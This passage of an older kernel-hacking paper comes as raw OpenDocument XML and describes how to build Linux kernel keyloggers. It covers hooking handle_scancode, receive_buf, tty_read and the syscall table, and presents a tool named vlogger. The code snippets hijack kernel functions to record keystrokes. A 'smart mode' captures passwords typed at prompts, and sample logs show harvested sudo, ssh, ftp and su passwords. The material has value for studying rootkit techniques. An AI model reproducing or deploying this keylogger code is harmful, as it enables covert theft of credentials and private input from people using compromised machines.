handle_scancode code. <text:s/>Call</text:p></text:list-item><text:list-item><text:p text:style-name="P9"><text:s text:c="8"/>* the restored function and re-restore the jump code. <text:s/>Code is</text:p></text:list-item><text:list-item><text:p text:style-name="P9"><text:s text:c="8"/>* protected by semaphore hs_sem, we only want one CPU in here at a</text:p></text:list-item><text:list-item><text:p text:style-name="P9"><text:s text:c="8"/>* time.</text:p></text:list-item><text:list-item><text:p text:style-name="P9"><text:s text:c="8"/>*/ <text:s text:c="4"/></text:p></text:list-item><text:list-item><text:p text:style-name="P9"><text:s text:c="7"/>down(&amp;hs_sem);</text:p></text:list-item><text:list-item><text:p text:style-name="P9"><text:s text:c="4"/></text:p></text:list-item><text:list-item><text:p text:style-name="P9"><text:s text:c="7"/>memcpy(handle_scancode, hs_code, CODESIZE);</text:p></text:list-item><text:list-item><text:p text:style-name="P9"><text:s text:c="7"/>handle_scancode(scancode, keydown);</text:p></text:list-item><text:list-item><text:p text:style-name="P9"><text:s text:c="7"/>memcpy(handle_scancode, hs_jump, CODESIZE);</text:p></text:list-item><text:list-item><text:p text:style-name="P9"><text:s text:c="4"/></text:p></text:list-item><text:list-item><text:p text:style-name="P9"><text:s text:c="7"/>up(&amp;hs_sem);</text:p></text:list-item><text:list-item><text:p text:style-name="P9">}</text:p></text:list-item><text:list-item><text:p text:style-name="P9"/></text:list-item><text:list-item><text:p text:style-name="P9">HS_ADDRESS is set by the Makefile executing this command</text:p></text:list-item><text:list-item><text:p text:style-name="P9">HS_ADDRESS=0x$(word 1,$(shell ksyms -a | grep handle_scancode))</text:p></text:list-item></text:list><text:p text:style-name="P1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Similar to method presented in 3.1, the advantage of this method is the ability to log keystrokes under X and the console, no matter if a tty is invoked or not. <text:s/>And you will know exactly what key is pressed on the keyboard (including special keys such as <text:span text:style-name="T9">Control, Alt, Shift, Print Screen</text:span>). <text:s/>But this method is platform dependent and won't be portable among platforms. <text:s/>This method also can't log keystroke of remote sessions and is quite complex for building an advance logger.</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P14">3.2.2 - put_queue</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"><text:tab/>This function is called by <text:span text:style-name="T9">handle_scancode()</text:span> function to put characters into <text:span text:style-name="T9">tty_queue</text:span>. </text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P17"># /usr/src/linux/drives/char/keyboard.c</text:p>
      <text:p text:style-name="P18"><text:span text:style-name="T7">void put_queue(int ch);</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:tab/>To intercept this function, we can use the above technique as in section (3.2.1).</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P14">3.2.3 - receive_buf</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"><text:tab/><text:span text:style-name="T9">receive_buf()</text:span> function is called by the low-level tty driver to send characters received by the hardware to the line discipline for processing.</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P17"># /usr/src/linux/drivers/char/n_tty.c */</text:p>
      <text:p text:style-name="P18"><text:span text:style-name="T7">static void n_tty_receive_buf(struct tty_struct *tty, const ,unsigned char *cp, char *fp, int count)</text:span></text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"><text:tab/><text:span text:style-name="T10">cp</text:span> is a pointer to the buffer of input character received by the device. fp is a pointer to a pointer of flag bytes which indicate whether a character was received with a parity error, etc. Lets take a deeper look into tty structures</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P23"># /usr/include/linux/tty.h</text:p>
      <text:p text:style-name="P23">struct tty_struct {</text:p>
      <text:p text:style-name="P23"><text:tab/>int<text:tab/>magic;</text:p>
      <text:p text:style-name="P23"><text:tab/>struct tty_driver driver;</text:p>
      <text:p text:style-name="P23"><text:tab/>struct tty_ldisc ldisc;</text:p>
      <text:p text:style-name="P23"><text:tab/>struct termios *termios, *termios_locked;</text:p>
      <text:p text:style-name="P23"><text:tab/>...</text:p>
      <text:p text:style-name="P23">}</text:p>
      <text:p text:style-name="P23"/>
      <text:p text:style-name="P23"># /usr/include/linux/tty_ldisc.h</text:p>
      <text:p text:style-name="P23">struct tty_ldisc {</text:p>
      <text:p text:style-name="P23"><text:tab/>int<text:tab/>magic;</text:p>
      <text:p text:style-name="P23"><text:tab/>char<text:tab/>*name;</text:p>
      <text:p text:style-name="P23"><text:tab/>...<text:tab/></text:p>
      <text:p text:style-name="P23"><text:tab/>void<text:tab/>(*receive_buf)(struct tty_struct *, </text:p>
      <text:p text:style-name="P23"><text:tab/><text:tab/><text:tab/>const unsigned char *cp, char *fp, int count);</text:p>
      <text:p text:style-name="P23"><text:tab/>int<text:tab/>(*receive_room)(struct tty_struct *);</text:p>
      <text:p text:style-name="P23"><text:tab/>void<text:tab/>(*write_wakeup)(struct tty_struct *);</text:p>
      <text:p text:style-name="P23">};</text:p>
      <text:p text:style-name="P23"/>
      <text:p text:style-name="P1"><text:tab/>To intercept this function, we can save the original tty <text:span text:style-name="T9">receive_buf()</text:span> function then set <text:span text:style-name="T4">ldisc.receive_buf</text:span> to our own <text:span text:style-name="T9">new_receive_buf()</text:span> function in order to logging user inputs. </text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"><text:tab/>Example: to log inputs on the tty0</text:p>
      <text:p text:style-name="P1"><draw:frame draw:style-name="fr2" draw:name="Frame7" text:anchor-type="paragraph" svg:x="0.2902in" svg:y="0.1402in" svg:width="6.2965in" draw:z-index="15"><draw:text-box fo:min-height="2.6173in"><text:list xml:id="list2001191049" text:style-name="L5"><text:list-header><text:p text:style-name="P10"/></text:list-header><text:list-item><text:p text:style-name="P10">int fd = open("/dev/tty0", O_RDONLY, 0);</text:p></text:list-item><text:list-item><text:p text:style-name="P10">struct file *file = fget(fd);</text:p></text:list-item><text:list-item><text:p text:style-name="P10">struct tty_struct *tty = file-&gt;private_data;</text:p></text:list-item><text:list-item><text:p text:style-name="P10">old_receive_buf = tty-&gt;ldisc.receive_buf;</text:p></text:list-item><text:list-item><text:p text:style-name="P10">tty-&gt;ldisc.receive_buf = new_receive_buf;</text:p></text:list-item><text:list-item><text:p text:style-name="P10"/></text:list-item><text:list-item><text:p text:style-name="P10">void new_receive_buf(struct tty_struct *tty, const unsigned char *cp, char *fp, int count)</text:p></text:list-item><text:list-item><text:p text:style-name="P10">{<text:tab/></text:p></text:list-item><text:list-item><text:p text:style-name="P10"><text:tab/>logging(tty, cp, count); <text:tab/>//log inputs</text:p></text:list-item><text:list-item><text:p text:style-name="P10"/></text:list-item><text:list-item><text:p text:style-name="P10"><text:tab/>/* call the original receive_buf */</text:p></text:list-item><text:list-item><text:p text:style-name="P10"><text:tab/>(*old_receive_buf)(tty, cp, fp, count);</text:p></text:list-item><text:list-item><text:p text:style-name="P4">}</text:p><text:p text:style-name="P4"/></text:list-item></text:list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3.2.4 - tty_read</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"><text:tab/>This function is called when a process wants to read input characters from a tty via <text:span text:style-name="T9">sys_read() </text:span>function.</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P17"># /usr/src/linux/drives/char/tty_io.c</text:p>
      <text:p text:style-name="P17">static ssize_t tty_read(struct file * file, char * buf, size_t count, loff_t *ppos)</text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17"><text:soft-page-break/>static struct file_operations tty_fops = {</text:p>
      <text:p text:style-name="P17"><text:tab/>llseek:<text:tab/><text:tab/>tty_lseek,</text:p>
      <text:p text:style-name="P17"><text:tab/>read:<text:tab/><text:tab/>tty_read,</text:p>
      <text:p text:style-name="P17"><text:tab/>write:<text:tab/><text:tab/>tty_write,</text:p>
      <text:p text:style-name="P17"><text:tab/>poll:<text:tab/><text:tab/>tty_poll,</text:p>
      <text:p text:style-name="P17"><text:tab/>ioctl:<text:tab/><text:tab/>tty_ioctl,</text:p>
      <text:p text:style-name="P17"><text:tab/>open:<text:tab/><text:tab/>tty_open,</text:p>
      <text:p text:style-name="P17"><text:tab/>release:<text:tab/>tty_release,</text:p>
      <text:p text:style-name="P17"><text:tab/>fasync:<text:tab/><text:tab/>tty_fasync,</text:p>
      <text:p text:style-name="P17">};</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"><text:tab/>To log inputs on the tty0:</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P26">int fd = open("/dev/tty0", O_RDONLY, 0);</text:p>
      <text:p text:style-name="P26">struct file *file = fget(fd);<text:tab/></text:p>
      <text:p text:style-name="P26">old_tty_read = file-&gt;f_op-&gt;read;</text:p>
      <text:p text:style-name="P26">file-&gt;f_op-&gt;read = new_tty_read;</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P14">3.2.5 - sys_read/sys_write</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"><text:tab/>We will intercept <text:span text:style-name="T5">sys_read / sys_write</text:span> system calls to redirect it to our own code which logs the content of the read/write calls. <text:s/>This method was presented by halflife in Phrack 50 (see [4]). <text:s/>I highly recommend reading that paper and a great article written by pragmatic called "Complete Linux Loadable Kernel Modules" (see [2]).</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"><text:tab/>The code to intercept sys_read/sys_write will be something like this:</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P25">extern void *sys_call_table[];</text:p>
      <text:p text:style-name="P25">original_sys_read = sys_call_table[__NR_read];</text:p>
      <text:p text:style-name="P25">sys_call_table[__NR_read] = new_sys_read;</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P8">4 - vlogger</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"><text:tab/>This part will introduce my kernel keylogger which is used method described in section 3.2.3 to acquire more abilities than common keyloggers used <text:span text:style-name="T9">sys_read/sys_write</text:span> syscall replacement approach. <text:s/>I have tested the code with the following versions of linux kernel: 2.4.5, 2.4.7, 2.4.17 and 2.4.18. </text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P14">4.1 - The syscall/tty approach</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"><text:tab/>To logging both local (logged from console) and remote sessions, I chose the method of intercepting <text:span text:style-name="T4">receive_buf()</text:span> function (see 3.2.3).</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"><text:tab/>In the kernel, <text:span text:style-name="T4">tty_struct</text:span> and <text:span text:style-name="T4">tty_queue</text:span> structures are dynamically allocated only when the tty is open. <text:s/>Thus, we also have to intercept sys_open syscall to dynamically hooking the <text:span text:style-name="T9">receive_buf()</text:span> function of each tty or pty when it's invoked.</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P16"><draw:frame draw:style-name="fr2" draw:name="Frame8" text:anchor-type="paragraph" svg:x="0.2319in" svg:y="0.1283in" svg:width="6.4071in" draw:z-index="16"><draw:text-box fo:min-height="8.0256in"><text:p text:style-name="P1"/><text:list xml:id="list1585578679" text:style-name="L8"><text:list-item><text:p text:style-name="P11">// to intercept open syscall</text:p></text:list-item><text:list-item><text:p text:style-name="P11">original_sys_open = sys_call_table[__NR_open];</text:p></text:list-item><text:list-item><text:p text:style-name="P11">sys_call_table[__NR_open] = new_sys_open;</text:p></text:list-item><text:list-item><text:p text:style-name="P11"/></text:list-item><text:list-item><text:p text:style-name="P11">// new_sys_open()</text:p></text:list-item><text:list-item><text:p text:style-name="P11">asmlinkage int new_sys_open(const char *filename, int flags, int mode)</text:p></text:list-item><text:list-item><text:p text:style-name="P11">{</text:p></text:list-item><text:list-item><text:p text:style-name="P11">...</text:p></text:list-item><text:list-item><text:p text:style-name="P11"><text:tab/>// call the original_sys_open</text:p></text:list-item><text:list-item><text:p text:style-name="P11"><text:tab/>ret = (*original_sys_open)(filename, flags, mode);</text:p></text:list-item><text:list-item><text:p text:style-name="P11"><text:tab/></text:p></text:list-item><text:list-item><text:p text:style-name="P11"><text:tab/>if (ret &gt;= 0) {</text:p></text:list-item><text:list-item><text:p text:style-name="P11"><text:tab/><text:tab/>struct tty_struct * tty;</text:p></text:list-item><text:list-item><text:p text:style-name="P11">...</text:p></text:list-item><text:list-item><text:p text:style-name="P11"><text:tab/><text:tab/>file = fget(ret);</text:p></text:list-item><text:list-item><text:p text:style-name="P11"><text:tab/><text:tab/>tty = file-&gt;private_data;</text:p></text:list-item><text:list-item><text:p text:style-name="P11"><text:tab/><text:tab/>if (tty != NULL &amp;&amp; </text:p></text:list-item><text:list-item><text:p text:style-name="P11">...</text:p></text:list-item><text:list-item><text:p text:style-name="P11"><text:tab/><text:tab/><text:tab/>tty-&gt;ldisc.receive_buf != new_receive_buf) {</text:p></text:list-item><text:list-item><text:p text:style-name="P11">...</text:p></text:list-item><text:list-item><text:p text:style-name="P11"><text:tab/><text:tab/><text:tab/><text:tab/>// save the old receive_buf<text:tab/><text:tab/><text:tab/></text:p></text:list-item><text:list-item><text:p text:style-name="P11"><text:tab/><text:tab/><text:tab/><text:tab/>old_receive_buf = tty-&gt;ldisc.receive_buf;</text:p></text:list-item><text:list-item><text:p text:style-name="P11">...</text:p></text:list-item><text:list-item><text:p text:style-name="P11"/></text:list-item><text:list-item><text:p text:style-name="P11"><text:tab/><text:tab/> <text:s text:c="6"/>/* </text:p></text:list-item><text:list-item><text:p text:style-name="P11"><text:tab/><text:tab/> <text:s text:c="7"/>* init to intercept receive_buf of this tty</text:p></text:list-item><text:list-item><text:p text:style-name="P11"><text:tab/><text:tab/> <text:s text:c="7"/>* tty-&gt;ldisc.receive_buf = new_receive_buf;</text:p></text:list-item><text:list-item><text:p text:style-name="P11"><text:tab/><text:tab/> <text:s text:c="7"/>*/</text:p></text:list-item><text:list-item><text:p text:style-name="P11"><text:tab/><text:tab/><text:tab/>init_tty(tty, TTY_INDEX(tty));</text:p></text:list-item><text:list-item><text:p text:style-name="P11"><text:tab/><text:tab/>}</text:p></text:list-item><text:list-item><text:p text:style-name="P11">...</text:p></text:list-item><text:list-item><text:p text:style-name="P11">}</text:p></text:list-item><text:list-item><text:p text:style-name="P11"/></text:list-item><text:list-item><text:p text:style-name="P11">// our new receive_buf() function</text:p></text:list-item><text:list-item><text:p text:style-name="P11">void new_receive_buf(struct tty_struct *tty, const unsigned char *cp, </text:p></text:list-item><text:list-item><text:p text:style-name="P11"><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/>char *fp, int count)</text:p></text:list-item><text:list-item><text:p text:style-name="P11">{</text:p></text:list-item><text:list-item><text:p text:style-name="P11"><text:tab/>if (!tty-&gt;real_raw &amp;&amp; !tty-&gt;raw)<text:tab/>// ignore raw mode</text:p></text:list-item><text:list-item><text:p text:style-name="P11"><text:tab/><text:tab/>// call our logging function to log user inputs </text:p></text:list-item><text:list-item><text:p text:style-name="P11"><text:tab/><text:tab/>vlogger_process(tty, cp, count); </text:p></text:list-item><text:list-item><text:p text:style-name="P11"><text:tab/>// call the original receive_buf</text:p></text:list-item><text:list-item><text:p text:style-name="P11"><text:tab/>(*old_receive_buf)(tty, cp, fp, count);</text:p></text:list-item><text:list-item><text:p text:style-name="P11">}</text:p></text:list-item></text:list><text:p text:style-name="P1"/></draw:text-box></draw:frame><text:soft-page-break/><text:span text:style-name="T12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>4.2 - Features</text:span></text:p>
      <text:p text:style-name="P1"/>
      <text:list xml:id="list1924862075" text:style-name="L6">
        <text:list-item>
          <text:p text:style-name="P5">Logs both local and remote sessions (via tty &amp; pts)</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P5">Separate logging for each tty/session. <text:s/>Each tty has their own logging buffer.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P5">Nearly support all special chars such as arrow keys (left, right, up,down), F1 to F12, Shift+F1 to Shift+F12, Tab, Insert, Delete, End,Home, Page Up, Page Down, BackSpace, etc.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P5">Support some line editing keys included CTRL-U and BackSpace.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P5">Timestamps logging, timezone supported (ripped off some codes from libc).</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P5">Multiple logging modes</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P5"><text:span text:style-name="T4">dumb mode:</text:span> logs all keystrokes</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P5"><text:soft-page-break/><text:span text:style-name="T4">smart mode:</text:span> detects password prompt automatically to log user/password only. <text:s/>I used the similar technique presented in "Passive Analysis of SSH (Secure Shell) Traffic" paper by Solar Designer and Dug Song (see [6]). <text:s/>When the application turns input echoing off, we assume that it is for entering a password.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P5"><text:span text:style-name="T4">normal mode</text:span>: disable logging</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"><text:tab/>You can switch between logging modes by using a magic password.</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P17">#define VK_TOGLE_CHAR<text:tab/>29<text:tab/>// CTRL-]</text:p>
      <text:p text:style-name="P17">#define MAGIC_PASS<text:tab/>"31337"<text:tab/>// to switch mode, type MAGIC_PASS </text:p>
      <text:p text:style-name="P18"><text:span text:style-name="T7"><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/>// then press VK_TOGLE_CHAR key</text:span></text:p>
      <text:p text:style-name="P14">4.3 - How to use</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"><text:tab/>Change the following options</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P23">// directory to store log files</text:p>
      <text:p text:style-name="P23">#define LOG_DIR "/tmp/log"</text:p>
      <text:p text:style-name="P23"/>
      <text:p text:style-name="P23">// your local timezone</text:p>
      <text:p text:style-name="P23">#define TIMEZONE<text:tab/>7*60*60<text:tab/>// GMT+7</text:p>
      <text:p text:style-name="P23"/>
      <text:p text:style-name="P23">// your magic password</text:p>
      <text:p text:style-name="P24"><text:span text:style-name="T15">#define MAGIC_PASS<text:tab/>"31337"</text:span> </text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"><text:tab/>Below is how the log file looks like:</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P23">[root@localhost log]# ls -l</text:p>
      <text:p text:style-name="P23">total 60</text:p>
      <text:p text:style-name="P23">-rw------- <text:s text:c="3"/>1 root <text:s text:c="4"/>root <text:s text:c="9"/>633 Jun 19 20:59 pass.log</text:p>
      <text:p text:style-name="P23">-rw------- <text:s text:c="3"/>1 root <text:s text:c="4"/>root <text:s text:c="7"/>37593 Jun 19 18:51 pts11</text:p>
      <text:p text:style-name="P23">-rw------- <text:s text:c="3"/>1 root <text:s text:c="4"/>root <text:s text:c="10"/>56 Jun 19 19:00 pts20</text:p>
      <text:p text:style-name="P23">-rw------- <text:s text:c="3"/>1 root <text:s text:c="4"/>root <text:s text:c="9"/>746 Jun 19 20:06 pts26</text:p>
      <text:p text:style-name="P23">-rw------- <text:s text:c="3"/>1 root <text:s text:c="4"/>root <text:s text:c="9"/>116 Jun 19 19:57 pts29</text:p>
      <text:p text:style-name="P23">-rw------- <text:s text:c="3"/>1 root <text:s text:c="4"/>root <text:s text:c="8"/>3219 Jun 19 21:30 tty1</text:p>
      <text:p text:style-name="P23">-rw------- <text:s text:c="3"/>1 root <text:s text:c="4"/>root <text:s text:c="7"/>18028 Jun 19 20:54 tty2</text:p>
      <text:p text:style-name="P1"/>
      <text:section text:style-name="Sect1" text:name="Section1">
        <text:list xml:id="list558396390" text:style-name="L9">
          <text:list-item>
            <text:p text:style-name="P21">in dumb mode</text:p>
          </text:list-item>
        </text:list>
        <text:p text:style-name="P19"/>
        <text:p text:style-name="P29">[root@localhost log]# head tty2<text:tab/><text:tab/>// local session</text:p>
        <text:p text:style-name="P29">&lt;19/06/2002-20:53:47 uid=501 bash&gt; pwd</text:p>
        <text:p text:style-name="P29">&lt;19/06/2002-20:53:51 uid=501 bash&gt; uname -a</text:p>
        <text:p text:style-name="P29">&lt;19/06/2002-20:53:53 uid=501 bash&gt; lsmod</text:p>
        <text:p text:style-name="P29">&lt;19/06/2002-20:53:56 uid=501 bash&gt; pwd</text:p>
        <text:p text:style-name="P29">&lt;19/06/2002-20:54:05 uid=501 bash&gt; cd /var/log</text:p>
        <text:p text:style-name="P29">&lt;19/06/2002-20:54:13 uid=501 bash&gt; tail messages</text:p>
        <text:p text:style-name="P29">&lt;19/06/2002-20:54:21 uid=501 bash&gt; cd ~</text:p>
        <text:p text:style-name="P29">&lt;19/06/2002-20:54:22 uid=501 bash&gt; ls</text:p>
        <text:p text:style-name="P29">&lt;19/06/2002-20:54:29 uid=501 bash&gt; tty</text:p>
        <text:p text:style-name="P29">&lt;19/06/2002-20:54:29 uid=501 bash&gt; [UP]</text:p>
        <text:p text:style-name="P27"/>
        <text:p text:style-name="P29">[root@localhost log]# tail pts11<text:tab/>// remote session <text:s/></text:p>
        <text:p text:style-name="P29">&lt;19/06/2002-18:48:27 uid=0 bash&gt; cd new</text:p>
        <text:p text:style-name="P29">&lt;19/06/2002-18:48:28 uid=0 bash&gt; cp -p ~/code .</text:p>
        <text:p text:style-name="P29">&lt;19/06/2002-18:48:21 uid=0 bash&gt; lsmod</text:p>
        <text:p text:style-name="P29">&lt;19/06/2002-18:48:27 uid=0 bash&gt; cd /va[TAB][^H][^H]tmp/log/</text:p>
        <text:p text:style-name="P29">&lt;19/06/2002-18:48:28 uid=0 bash&gt; ls -l</text:p>
        <text:p text:style-name="P29">&lt;19/06/2002-18:48:30 uid=0 bash&gt; tail pts11</text:p>
        <text:p text:style-name="P29">&lt;19/06/2002-18:48:38 uid=0 bash&gt; [UP] | more</text:p>
        <text:p text:style-name="P29">&lt;19/06/2002-18:50:44 uid=0 bash&gt; vi vlogertxt</text:p>
        <text:p text:style-name="P29">&lt;19/06/2002-18:50:48 uid=0 vi&gt; :q</text:p>
        <text:p text:style-name="P29">&lt;19/06/2002-18:51:14 uid=0 bash&gt; rmmod vlogger</text:p>
        <text:p text:style-name="P29"/>
        <text:p text:style-name="P29"/>
        <text:list xml:id="list1549809647" text:style-name="L10">
          <text:list-item>
            <text:p text:style-name="P22">in smart mode</text:p>
          </text:list-item>
        </text:list>
        <text:p text:style-name="P19"/>
        <text:p text:style-name="P28">[root@localhost log]# cat pass.log</text:p>
        <text:p text:style-name="P28">[19/06/2002-18:28:05 tty=pts/20 uid=501 sudo]</text:p>
        <text:p text:style-name="P28">USER/CMD sudo traceroute yahoo.com</text:p>
        <text:p text:style-name="P28">PASS 5hgt6d</text:p>
        <text:p text:style-name="P28">PASS </text:p>
        <text:p text:style-name="P28"/>
        <text:p text:style-name="P28">[19/06/2002-19:59:15 tty=pts/26 uid=0 ssh]</text:p>
        <text:p text:style-name="P28">USER/CMD ssh guest@host.com</text:p>
        <text:p text:style-name="P28">PASS guest</text:p>
        <text:p text:style-name="P28"/>
        <text:p text:style-name="P28">[19/06/2002-20:50:44 tty=pts/29 uid=504 ftp]</text:p>
        <text:p text:style-name="P28">USER/CMD open ftp.ilog.fr</text:p>
        <text:p text:style-name="P28">USER Anonymous</text:p>
        <text:p text:style-name="P28">PASS heh@heh</text:p>
        <text:p text:style-name="P28"/>
        <text:p text:style-name="P28">[19/06/2002-20:59:54 tty=pts/29 uid=504 su]</text:p>
        <text:p text:style-name="P28">USER/CMD su -</text:p>
        <text:p text:style-name="P28">PASS asdf1234</text:p>
        <text:p text:style-name="P28"/>
        <text:p text:style-name="P28"/>
        <text:p text:style-name="P28"/>
        <text:p text:style-name="P28"/>
        <text:p text:style-name="P28"/>
        <text:p text:style-name="P28"/>
      </text:section>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"><text:tab/>Please check http://www.thc.org/ for update on the new version of this tool.</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T7"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T7">5 - Greets </text:span><text:s/></text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"><text:tab/>Thanks to plasmoid, skyper for your very useful comments</text:p>
      <text:p text:style-name="P1"><text:tab/>Greets to THC, vnsecurity and all friends</text:p>
      <text:p text:style-name="P1"><text:tab/>Finally, thanks to mr. thang for english corrections</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P8">6 - References</text:p>
      <text:p text:style-name="P1"/>
      <text:list xml:id="list58468293" text:style-name="L7">
        <text:list-item>
          <text:p text:style-name="P6">Linux Kernel Module Programming; <text:s/></text:p>
          <text:p text:style-name="P6">http://www.tldp.org/LDP/lkmpg/</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P6">Complete Linux Loadable Kernel Modules - Pragmatic</text:p>
          <text:p text:style-name="P6">http://www.thc.org/papers/LKM_HACKING.html</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P6">The Linux keyboard driver - Andries Brouwer </text:p>
          <text:p text:style-name="P6">http://www.linuxjournal.com/lj-issues/issue14/1080.html</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P6">Abuse of the Linux Kernel for Fun and Profit - Halflife</text:p>
          <text:p text:style-name="P6">http://www.phrack.com/phrack/50/P50-05</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P6">Kernel function hijacking - Silvio Cesare</text:p>
          <text:p text:style-name="P6">http://www.big.net.au/~silvio/kernel-hijack.txt</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P6">Passive Analysis of SSH (Secure Shell) Traffic - Solar Designer </text:p>
          <text:p text:style-name="P6">http://www.openwall.com/advisories/OW-003-ssh-traffic-analysis.txt</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P6">Kernel Based Keylogger - Mercenary</text:p>
          <text:p text:style-name="P6">http://packetstorm.decepticons.org/UNIX/security/kernel.keylogger.tx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Gill Sans Bold" svg:font-family="'Gill Sans Bold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701in" fo:margin-right="0.67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4T18:56:55</meta:creation-date>
    <dc:date>2009-08-24T22:56:35</dc:date>
    <meta:editing-duration>PT03H44M09S</meta:editing-duration>
    <meta:editing-cycles>17</meta:editing-cycles>
    <meta:generator>NeoOffice/3.0$Unix OpenOffice.org_project/Patch 0</meta:generator>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="9" meta:paragraph-count="304" meta:word-count="2484" meta:character-count="17310"/>
    <meta:user-defined meta:name="Info 1"/>
    <meta:user-defined meta:name="Info 2"/>
    <meta:user-defined meta:name="Info 3"/>
    <meta:user-defined meta:name="Info 4"/>
  </office:meta>
</office:document-meta>
</file>